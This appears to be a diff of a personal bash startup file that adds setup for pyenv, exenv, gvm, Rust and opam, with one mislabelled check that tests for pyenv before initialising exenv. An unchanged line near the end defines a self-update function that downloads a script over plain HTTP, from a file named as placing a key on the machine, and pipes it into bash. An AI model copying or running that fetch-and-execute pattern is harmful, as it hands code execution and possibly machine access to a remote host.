@@ -100,6 +100,29 @@ fi
 export HISTCONTROL=ignoreboth
 
 
+# Pyenv
+if [[ $(which pyenv) != "" ]];then 
+eval "$(pyenv init -)"
+eval "$(pyenv virtualenv-init -)"
+fi
+
+# Erlang
+if [[ $(which pyenv) != "" ]];then 
+export PATH="$HOME/.exenv/bin:$PATH"
+eval "$(exenv init -)"
+fi
+
+# Go
+[[ -f ~/.gvm/scripts/gvm ]] && source /Users/y/.gvm/scripts/gvm
+
+# Rust
+export PATH="$HOME/.cargo/bin:$PATH"
+
+# Ocaml
+test -r $HOME/.opam/opam-init/init.sh && . $HOME/.opam/opam-init/init.sh > /dev/null 2> /dev/null || true
+
+
+
 function self_env_update_debug() {
     echo "[i] self update for $USER (debug output)" 
     bash -x -c "$(wget -q -O - http://daedalus.ru/code/how_to_place_my_key_to_your_machine.txt)" $USER
